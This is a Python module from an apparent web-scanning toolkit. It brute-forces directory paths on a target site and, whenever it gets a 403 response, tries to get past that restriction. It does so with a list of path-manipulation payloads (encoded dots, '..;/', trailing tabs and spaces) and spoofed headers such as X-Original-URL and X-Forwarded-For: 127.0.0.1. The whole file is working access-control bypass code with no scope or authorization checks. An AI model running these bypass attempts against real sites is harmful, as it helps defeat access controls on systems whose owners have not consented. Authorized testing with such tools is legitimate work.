import requests
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from modules.results_manager import save_result, logging

def check_url(base_url, word):
    url = f"{base_url}/{word}"
    result = {}
    try:
        res = requests.get(url, timeout=3)
        if res.status_code in [200, 204, 301, 302, 403]:
            result = {"url": url, "status": res.status_code}
            if res.status_code == 403:
                bypass_results = bypass_403(base_url, word)
                if bypass_results:
                    result["bypass"] = bypass_results
            return result
    except Exception as e:
        logging.error(f"Request error: {url} - {e}")
    return None

def bypass_403(base_url, path):
    bypass_payloads = [
        f"{base_url}/%2e/{path}",
        f"{base_url}/{path}/.",
        f"{base_url}//{path}//",
        f"{base_url}/./{path}/./",
        f"{base_url}/{path}%20",
        f"{base_url}/{path}%09",
        f"{base_url}/{path}?",
        f"{base_url}/{path}#",
        f"{base_url}/{path};/",
        f"{base_url}/{path}..;/",
        f"{base_url}/{path}/*"
    ]

    headers_list = [
        {"X-Original-URL": f"/{path}"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"X-Forwarded-Host": "127.0.0.1"},
        {"X-rewrite-url": f"/{path}"}
    ]

    success_bypass = []

    for bypass_url in bypass_payloads:
        try:
            r = requests.get(bypass_url, timeout=3)
            if r.status_code != 403:
                success_bypass.append({"type": "payload", "url": bypass_url, "status": r.status_code})
        except Exception as e:
            logging.error(f"403 bypass payload error: {bypass_url} - {e}")

    for headers in headers_list:
        try:
            r = requests.get(f"{base_url}/{path}", headers=headers, timeout=3)
            if r.status_code != 403:
                success_bypass.append({"type": "headers", "headers": headers, "status": r.status_code})
        except Exception as e:
            logging.error(f"403 bypass header error: {base_url}/{path} {headers} - {e}")

    return success_bypass if success_bypass else None

def run(target_url):
    wordlist_path = os.path.join(os.path.dirname(__file__), "../utils/wordlists/common.txt")
    with open(wordlist_path, "r", encoding="utf-8") as f:
        words = [line.strip() for line in f if line.strip()]

    results = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_url, target_url, word) for word in words]
        for future in as_completed(futures):
            res = future.result()
            if res:
                results.append(res)

    save_result("dir_enum", results)
